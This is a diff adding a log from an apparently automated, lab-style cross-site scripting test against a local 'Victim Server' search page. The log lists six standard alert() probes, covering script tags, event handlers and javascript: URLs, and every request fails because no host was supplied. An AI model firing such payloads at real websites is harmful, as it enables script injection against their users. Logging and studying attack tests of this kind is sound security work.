@@ -1,0 +1,35 @@
+============================================================
+Attack Type: XSS
+Timestamp: 2026-01-04_07-53-33
+Target: :5000
+============================================================
+
+[07:53:27] 🔴 ATTACK INITIATED: Cross-Site Scripting (XSS)
+[07:53:27] Target: Victim Server (:5000/search)
+[07:53:27] 
+[Test 1/6] Basic Script Tag
+[07:53:27]    Payload: <script>alert('XSS')</script>
+[07:53:27]    ❌ Error: Invalid URL 'http://:5000/search': No host supplie
+[07:53:28] 
+[Test 2/6] Image Event Handler
+[07:53:28]    Payload: <img src=x onerror=alert('XSS')>
+[07:53:28]    ❌ Error: Invalid URL 'http://:5000/search': No host supplie
+[07:53:29] 
+[Test 3/6] SVG Onload
+[07:53:29]    Payload: <svg/onload=alert('XSS')>
+[07:53:29]    ❌ Error: Invalid URL 'http://:5000/search': No host supplie
+[07:53:30] 
+[Test 4/6] JavaScript Protocol
+[07:53:30]    Payload: javascript:alert('XSS')
+[07:53:30]    ❌ Error: Invalid URL 'http://:5000/search': No host supplie
+[07:53:31] 
+[Test 5/6] IFrame JavaScript
+[07:53:31]    Payload: <iframe src='javascript:alert(1)'>
+[07:53:31]    ❌ Error: Invalid URL 'http://:5000/search': No host supplie
+[07:53:32] 
+[Test 6/6] Body Event Handler
+[07:53:32]    Payload: <body onload=alert('XSS')>
+[07:53:32]    ❌ Error: Invalid URL 'http://:5000/search': No host supplie
+[07:53:33] 
+==================================================
+[07:53:33] 📊 XSS Test Summary: 0 accepted, 0 blocked
